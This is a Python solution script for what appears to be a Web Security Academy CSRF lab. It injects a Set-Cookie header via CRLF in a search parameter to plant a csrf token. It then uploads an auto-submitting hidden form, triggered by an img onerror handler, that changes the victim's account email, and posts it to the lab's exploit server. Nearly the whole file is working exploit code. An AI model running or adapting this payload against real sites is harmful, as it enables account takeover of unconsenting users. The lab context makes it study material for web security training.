import requests
import urllib.parse

# === Step 1: Configure these values ===
site = '0a89003704c1460080a1039900ff0079.web-security-academy.net'   # <-- Replace with your lab site domain
exploit_server = 'https://exploit-0a9f00fe0452467c80a502c901c300dc.exploit-server.net'  # <-- Replace with your exploit server domain

# === Step 2: Create CSRF injection payload ===
search_term = urllib.parse.quote("dummy\r\nSet-Cookie: csrf=foo; SameSite=None")
search_url = f'https://{site}/?search={search_term}'
change_email_url = f'https://{site}/my-account/change-email'

# === Step 3: Malicious HTML to change victimâ€™s email ===
exploit_html = f'''
<form action="{change_email_url}" method="POST">
    <input type="hidden" name="email" value="lamlon@pdx.edu">
    <input type="hidden" name="csrf" value="foo">
</form>
<img src="{search_url}" onerror="document.forms[0].submit();">
'''

# === Step 4: Upload the exploit to the exploit server ===
exploit_data = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

print("[*] Uploading email-change CSRF exploit...")
r = requests.post(exploit_server, data=exploit_data)

if r.status_code == 200:
    print(f"[+] Exploit uploaded successfully.")
    print(f"[+] Visit {exploit_server}/exploit or wait for the victim to trigger it.")
else:
    print(f"[-] Upload failed. Status code: {r.status_code}")